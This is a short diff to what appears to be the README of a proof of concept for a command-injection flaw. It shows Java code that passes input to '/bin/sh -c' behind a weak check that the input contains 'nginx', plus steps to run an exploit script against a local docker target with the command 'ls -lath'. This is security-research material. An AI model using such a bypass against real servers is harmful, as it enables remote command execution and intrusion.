@@ -37,7 +37,8 @@ try {
 }
 ```
 
-The command is necessary to send text "nginx"
+The text "nginx" is necessary in the send payload.
+
 ```java
 if(!cmd.contains("nginx")){
     cmd = "nginx restart";
@@ -54,5 +55,6 @@ RuntimeUtil.execForStr("/bin/sh", "-c", cmd);
 
 ```bash
 docker-compose up -d
-python3 main.py -u http://localhost:8585 -c "ls -lath"
+pip3 install -r poc/requirements.txt
+python3 poc/main.py -u http://localhost:8585 -c "ls -lath"
 ```
